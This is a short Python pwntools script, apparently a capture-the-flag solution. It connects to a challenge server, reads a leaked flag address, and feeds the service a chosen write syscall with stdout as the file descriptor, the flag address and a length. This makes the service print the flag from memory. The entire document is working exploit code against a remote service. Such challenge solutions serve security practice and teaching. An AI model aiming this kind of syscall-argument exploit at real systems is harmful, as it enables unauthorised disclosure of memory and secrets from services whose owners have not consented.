from pwn import *

def exploit():
    p = remote("pwn.cyber.jawara.systems", 13371)
    syscall = 1
    fd = 1

    p.recvuntil("flag: ")
    flag_addr = int(p.recvline(), 16)
    log.info("Flag address : {}".format(hex(flag_addr)))

    p.sendline(str(syscall))
    p.sendline(str(fd))
    p.sendline(str(flag_addr))
    p.sendline(str(100))
    p.sendline(str(0))
    p.sendline(str(0))
    p.sendline(str(0))

    p.interactive()

if __name__ == "__main__":
    exploit()